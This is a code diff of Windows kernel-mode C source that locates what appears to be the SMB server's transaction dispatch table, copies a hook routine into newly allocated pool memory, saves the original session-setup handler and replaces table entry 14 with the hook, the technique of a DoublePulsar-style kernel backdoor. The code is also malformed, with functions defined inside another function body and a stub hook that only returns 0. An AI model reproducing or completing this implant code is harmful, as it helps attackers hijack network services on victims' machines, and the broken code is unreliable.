@@ -30,10 +30,13 @@
 #include "hashes.h"
 
 #define INDEX_SESSION_SETUP 14
+//#define STATUS_INVALID_PARAMETER 0xC000000D
 
 #define RV2OFF(Base, Rva)(((ULONG_PTR)Base) + Rva) 
 #define NT_HDR(x) (PIMAGE_NT_HEADERS)\
 (RV2OFF(x, ((PIMAGE_DOS_HEADER)x)->e_lfanew))
+
+LPVOID g_SrvTransactionNotImplemented;
 
 INT WindowsEntrypoint()
 {
@@ -106,12 +109,13 @@ INT WindowsEntrypoint()
       TrnTbl++;
     } while ( SecNm1-- != 0 );
 
-    NTSTATUS SpAcceptLsaModeContext_Hook()
+    NTSTATUS 
+    SpAcceptLsaModeContext_Hook(PVOID WorkContext)
     {
       return 0;
     };
- 
-    VOID SpAcceptLsaModeContext_Hook_End() {};
+    VOID 
+    SpAcceptLsaModeContext_Hook_End() {};
 
 FoundTransactionTable:
     Func.ExAllocatePool = GetPeFunc(
@@ -119,18 +123,18 @@ FoundTransactionTable:
     );
 
     HookNm = (DWORD)(
-	((ULONG_PTR)SpAcceptLsaModeContext_Hook_End) - 
-	((ULONG_PTR)SpAcceptLsaModeContext_Hook));    
-    HckPtr = Func.ExAllocatePool(PagedPool, HookNm);
+	((ULONG_PTR)&SpAcceptLsaModeContext_Hook_End) - 
+	((ULONG_PTR)&SpAcceptLsaModeContext_Hook));    
+    HckPtr = Func.ExAllocatePool(NonPagedPool, HookNm + 4);
     
     OnePtr = HckPtr; TwoPtr = (LPVOID)
       &SpAcceptLsaModeContext_Hook;
 
-    do {
+    while ( HookNm-- != 0 )
       *(BYTE *)OnePtr++ = *(BYTE *)TwoPtr++;
-    } while ( HookNm-- != 0 );
 
-    TblPtr[INDEX_SESSION_SETUP] = (LPVOID)HckPtr;
+    g_SrvTransactionNotImplemented = TrnTbl[INDEX_SESSION_SETUP];
+    TrnTbl[INDEX_SESSION_SETUP]    = (LPVOID)HckPtr;
   };
 
   return 0;
